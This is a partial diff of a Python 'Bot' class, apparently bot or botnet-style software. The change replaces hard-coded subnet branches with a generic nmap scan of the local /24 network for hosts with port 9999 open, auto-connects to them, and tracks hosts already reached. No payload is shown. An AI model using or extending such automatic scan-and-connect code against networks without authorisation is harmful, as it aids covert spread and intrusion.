@@ -7,15 +7,15 @@ import hashlib
 import hmac
 import socket
 import urllib
-import sys
 
 class Bot:
 
 	BLOCK_SIZE = 16
 	PADDING = '\0'
+	
 	SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	server = 'localhost'
 	port = 9999
+	connected_hosts = []
 
 	def __init__(self):
 		self.key = Random.new().read(self.BLOCK_SIZE)
@@ -24,6 +24,7 @@ class Bot:
 	def connect(self, serv, portNum):
 		try:
 			self.SERVER.connect((serv, portNum))
+			self.connected_hosts.append(serv)
 		except:
 			print("[-] Could Not Connect")	
 		
@@ -90,17 +91,11 @@ class Bot:
 		nm = nmap.PortScanner()
 		ip_range = self.get_local_ip()[:-2]
 		
-		if ip_range == "192.168.2":
-			nm.scan('192.168.2.0-255', str(self.port))
-			for host in nm.all_hosts():
-				state = nm[host]['tcp'][self.port]['state']
-				if state == 'open':
-					self.connect(host, self.port)
-				else:
-					print("%s Closed" % host)
-		elif ip_range == "192.168.1":
-			nm.scan('192.168.1.0-255', str(self.port))
-			for host in nm.all_hosts():
+		subnet = ip_range + '.0-255'
+		print subnet
+		nm.scan(subnet, str(self.port))
+		for host in nm.all_hosts():
+			if host not in self.connected_hosts:
 				state = nm[host]['tcp'][self.port]['state']
 				if state == 'open':
 					self.connect(host, self.port)
